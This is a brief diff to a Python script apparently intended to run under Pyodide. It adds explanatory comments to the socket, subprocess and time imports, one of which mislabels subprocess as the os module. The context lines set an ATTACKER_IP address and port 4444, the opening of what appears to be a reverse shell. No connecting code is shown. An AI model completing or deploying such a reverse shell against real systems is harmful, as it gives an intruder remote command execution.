@@ -1,7 +1,7 @@
 # This logic needs to be executed by Pyodide
-import socket
-import subprocess
-import time
+import socket #import socket module for network communication
+import subprocess #import os module for executing shell commands
+import time #import time module for adding delays
 
 ATTACKER_IP = "172.26.233.12"
 PORT = 4444
